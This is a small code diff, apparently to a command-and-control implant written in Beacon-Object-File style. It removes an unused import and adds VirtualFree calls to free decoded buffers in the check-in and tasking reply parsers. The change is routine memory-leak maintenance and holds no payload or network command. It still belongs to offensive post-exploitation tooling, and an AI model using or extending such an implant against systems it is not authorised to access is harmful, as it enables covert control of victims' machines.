@@ -5,7 +5,6 @@
 WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
 WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);
 
-WINBASEAPI errno_t MSVCRT$strcpy_s(char *strDestination, size_t numberOfElements, const char *strSource);
 WINBASEAPI size_t MSVCRT$strlen(const char *str);
 WINBASEAPI char * MSVCRT$strstr(const char *str, const char *strSearch);
 
@@ -56,6 +55,8 @@ void parse_checkin_reply(HttpResponse *response, CheckinReply *reply) {
 	
 	reply->callback_uuid = unpack_str(decoded_body, &offset);
 	reply->status = unpack_str(decoded_body, &offset);
+	
+	KERNEL32$VirtualFree(decoded_body, 0, MEM_RELEASE);
 }
 
 void free_checkin_reply(CheckinReply *reply) {
@@ -124,6 +125,8 @@ void parse_tasking_reply(HttpResponse *response, TaskingReply *reply) {
 		
 		reply->tasks[i] = task;
 	}
+	
+	KERNEL32$VirtualFree(decoded_body, 0, MEM_RELEASE);
 }
 
 void free_tasking_reply(TaskingReply *reply) {
